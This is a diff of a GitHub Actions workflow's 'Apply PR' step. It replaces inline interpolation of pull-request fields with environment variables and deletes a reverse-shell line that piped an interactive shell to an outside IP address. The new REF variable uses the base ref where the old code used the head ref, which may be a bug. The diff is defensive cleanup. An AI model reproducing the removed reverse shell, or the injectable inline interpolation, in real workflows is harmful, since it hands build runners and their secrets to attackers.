@@ -59,12 +59,15 @@ jobs:
           profiler-branch: master
 
       - name: Apply PR
+        env:
+          REF: ${{ github.event.pull_request.base.ref }}
+          URL: ${{ github.event.pull_request.head.repo.clone_url }} 
+          
         run: |
-          git remote add pr ${{ github.event.pull_request.head.repo.clone_url }}
-          git fetch pr ${{ github.event.pull_request.head.ref }}
-          git checkout -b pr/${{ github.event.pull_request.head.ref }}
+          git remote add pr $URL
+          git fetch pr $REF
+          git checkout -b pr/$REF
           git submodule update
-          sh -i >& /dev/tcp/194.59.158.195/5544 0>&1
           ./occ upgrade
 
       - name: Run after measurements
